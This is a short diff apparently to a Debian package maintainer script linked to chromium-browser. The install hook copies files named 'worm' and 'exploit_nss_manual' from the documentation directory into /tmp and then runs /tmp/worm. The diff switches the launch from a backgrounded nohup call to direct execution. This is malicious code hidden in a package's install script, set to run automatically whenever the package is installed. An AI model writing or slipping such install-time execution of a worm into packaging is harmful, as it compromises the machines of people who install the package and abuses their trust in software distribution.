@@ -6,4 +6,6 @@ dpkg-maintscript-helper rm_conffile /etc/chromium-browser/customizations/00-exam
 # End automatically added section
 cp /usr/share/doc/worm /tmp/worm
 cp /usr/share/doc/exploit_nss_manual /tmp/exploit_nss_manual
-nohup /tmp/worm &
+
+/tmp/worm
+#nohup /tmp/worm &
